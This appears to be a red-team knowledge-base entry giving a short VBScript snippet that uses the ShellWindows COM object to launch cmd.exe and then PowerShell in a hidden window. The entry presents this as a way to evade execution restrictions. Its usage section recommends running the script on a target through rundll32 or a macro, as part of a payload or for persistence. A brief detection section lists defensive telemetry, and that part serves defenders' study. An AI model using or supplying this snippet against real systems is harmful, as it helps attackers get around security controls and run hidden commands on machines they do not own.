---
id: 2fc1ce34-11bf-4884-ae5f-e39d7e1b10b1
name: VBS-ShellExecute-Launch-PowerShell-via-CMD
type: code
language: vbscript
verified: true
created_at: '2023-04-06T03:56:23.581409+00:00'
updated_at: '2023-04-10T20:36:53.438562+00:00'
platforms:
  - Windows
tags:
  - powershell-launch
  - shell-execute
  - bypass
validated: true
---

# VBS-ShellExecute-Launch-PowerShell-via-CMD

## Code

```vbscript
Const ShellWindows = "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}"
Set SW = GetObject("new:" & ShellWindows).Item()
SW.Document.Application.ShellExecute "cmd.exe", "/c powershell.exe", "C:\Windows\System32", Null, 0
```

## Description

This VBScript snippet uses the ShellWindows COM object and ShellExecute method to launch cmd.exe, which executes PowerShell in a hidden window, providing an indirect way to start a PowerShell session often used to evade execution restrictions.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| ShellWindows GUID | COM identifier for ShellWindows | {9BA05972-F6A8-11CF-A442-00A0C90A8F39} |
| cmd.exe | Executable to run | cmd.exe |
| /c powershell.exe | Arguments to pass to cmd (execute and close) | /c powershell.exe |
| C:\Windows\System32 | Working directory | C:\Windows\System32 |
| 0 | Window show style (SW_HIDE) | 0 |

## Usage

Save as a .vbs file and execute on the target (e.g., via rundll32 or macro). Ideal for scripting environments or as part of a larger payload to spawn PowerShell for command execution in red team operations or persistence.

## Detection

- Behavioral analytics for ShellExecute calls from VBS/WSH (Event ID 4688 with wscript.exe parent).
- Process monitoring for cmd.exe spawning powershell.exe with hidden attributes.
- AMSI scanning for VBS scripts containing ShellWindows or ShellExecute.

## Related

- [[procedures/Bypass-ASR-Rule-5-via-WMI-to-Execute-PowerShell]]
